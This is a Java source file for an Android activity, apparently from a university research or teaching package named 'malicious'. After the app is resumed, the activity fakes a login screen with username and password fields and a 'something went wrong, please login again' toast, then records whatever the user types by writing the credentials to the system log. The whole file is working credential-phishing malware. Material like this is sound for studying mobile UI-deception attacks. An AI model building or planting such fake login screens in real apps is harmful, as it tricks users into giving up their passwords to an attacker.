package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.InputType;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.Toast;

public class MalActivity extends AppCompatActivity {

    static int controlVar = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (controlVar == 0) {
            RelativeLayout relativeLayout = (RelativeLayout) findViewById(R.id.activity_mal);
            relativeLayout.removeView(findViewById(R.id.someText));
            final EditText malUsername = new EditText(getApplicationContext());
            RelativeLayout.LayoutParams rlp2 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
            rlp2.addRule(RelativeLayout.CENTER_IN_PARENT);
            malUsername.setLayoutParams(rlp2);
            malUsername.setId(R.id.mal_username);
            malUsername.setHint("Username");
            relativeLayout.addView(malUsername);
            final EditText malPwd = new EditText(getApplicationContext());
            RelativeLayout.LayoutParams rlp = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
            rlp.addRule(RelativeLayout.BELOW, R.id.mal_username);
            rlp.addRule(RelativeLayout.CENTER_IN_PARENT);
            malPwd.setLayoutParams(rlp);
            malPwd.setId(R.id.mal_pwd);
            malPwd.setInputType(InputType.TYPE_NUMBER_VARIATION_PASSWORD);
            malPwd.setHint("Password");
            relativeLayout.addView(malPwd);
            final Button malSignIn = new Button(getApplicationContext());
            RelativeLayout.LayoutParams rlp1 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
            rlp1.addRule(RelativeLayout.BELOW, R.id.mal_pwd);
            rlp1.addRule(RelativeLayout.CENTER_IN_PARENT);
            malSignIn.setLayoutParams(rlp1);
            malSignIn.setText("SignIn");
            relativeLayout.addView(malSignIn);
            malSignIn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    saveCredentials(malUsername.getText().toString(), malPwd.getText().toString());
                }
            });
            Toast.makeText(getApplicationContext(), "Oops! something went wrong please login again..", Toast.LENGTH_SHORT).show();
        } else if (controlVar == 1) {
            controlVar = 0;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int responseCode, Intent data) {
        Toast.makeText(getApplicationContext(), "on Activity result called..", Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onNewIntent(Intent newIntent) {
        Toast.makeText(getApplicationContext(), "on new intent called..", Toast.LENGTH_SHORT).show();
    }

    private void saveCredentials(String username, String password) {
        Log.d("Malicious1", "User : " + username + " Password : " + password);
    }
}
